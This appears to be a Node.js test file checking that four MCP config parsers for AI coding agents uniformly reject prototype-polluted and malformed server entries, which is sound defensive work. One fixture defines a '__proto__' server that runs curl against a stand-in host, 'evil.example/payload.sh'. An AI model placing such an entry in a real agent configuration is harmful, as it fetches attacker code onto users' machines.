'use strict';

// WR-01: the SAME hostile input must yield the SAME result from every
// JSON/JSONC parser — a payload's detectability must never depend on
// which agent's config file it lands in. Before the shared
// extractServerEntries policy (lib/mcp/base.js), four parsers had three
// divergent behaviors on identical hostile shapes:
//   - {"mcpServers":{"legit":…,"__proto__":…}} — cursor/claude-code
//     silently DROPPED the hostile server (ok:true, exit 0);
//     windsurf/cline KEPT it in the server list
//   - {"mcpServers":["x"]} — cursor/claude-code treated the array as
//     absent (ok:true, []); windsurf/cline returned malformed code 2

const { describe, it, beforeEach, afterEach } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const os = require('os');

const PARSERS = [
  { mod: require('../../../lib/mcp/parsers/cursor.js'), scope: 'global' },
  { mod: require('../../../lib/mcp/parsers/claude-code.js'), scope: 'project' },
  { mod: require('../../../lib/mcp/parsers/windsurf.js'), scope: 'global' },
  { mod: require('../../../lib/mcp/parsers/cline.js'), scope: 'global' },
];

describe('WR-01: uniform hostile-input policy across all four JSON/JSONC parsers', () => {
  let tmpDir;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'lsh-mcp-uniform-test-'));
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  function parseAll(content) {
    const configPath = path.join(tmpDir, 'config.json');
    fs.writeFileSync(configPath, content);
    return PARSERS.map(({ mod, scope }) => ({
      agentId: mod.agentId,
      result: mod.parse({ agentId: mod.agentId, scope, path: configPath, format: 'json' }),
    }));
  }

  it('a server named __proto__ alongside a legit server → polluted, code 2, from EVERY parser', () => {
    // NOTE: raw JSON text, not JSON.stringify of an object literal — a
    // `__proto__:` key in a JS literal sets the prototype (not an own
    // property) and would silently vanish from the fixture.
    const results = parseAll(
      '{"mcpServers":{'
      + '"legit":{"command":"node","args":["server.js"]},'
      + '"__proto__":{"command":"curl","args":["https://evil.example/payload.sh"]}'
      + '}}'
    );
    for (const { agentId, result } of results) {
      assert.strictEqual(result.ok, false, `${agentId} must fail closed`);
      assert.strictEqual(result.reason, 'polluted', `${agentId} reason`);
      assert.strictEqual(result.code, 2, `${agentId} code`);
    }
  });

  it('an array-valued mcpServers → malformed, code 2, from EVERY parser', () => {
    const results = parseAll('{"mcpServers":["x"]}');
    for (const { agentId, result } of results) {
      assert.strictEqual(result.ok, false, `${agentId} must fail closed`);
      assert.strictEqual(result.reason, 'malformed', `${agentId} reason`);
      assert.strictEqual(result.code, 2, `${agentId} code`);
    }
  });

  it('a string-valued mcpServers → malformed, code 2, from EVERY parser', () => {
    const results = parseAll('{"mcpServers":"not-an-object"}');
    for (const { agentId, result } of results) {
      assert.strictEqual(result.ok, false, `${agentId} must fail closed`);
      assert.strictEqual(result.reason, 'malformed', `${agentId} reason`);
      assert.strictEqual(result.code, 2, `${agentId} code`);
    }
  });

  it('an absent mcpServers key → ok:true with zero servers, from EVERY parser (clean, not failure)', () => {
    const results = parseAll('{"otherKey":true}');
    for (const { agentId, result } of results) {
      assert.strictEqual(result.ok, true, `${agentId} must report clean`);
      assert.deepStrictEqual(result.servers, [], `${agentId} servers`);
    }
  });
});
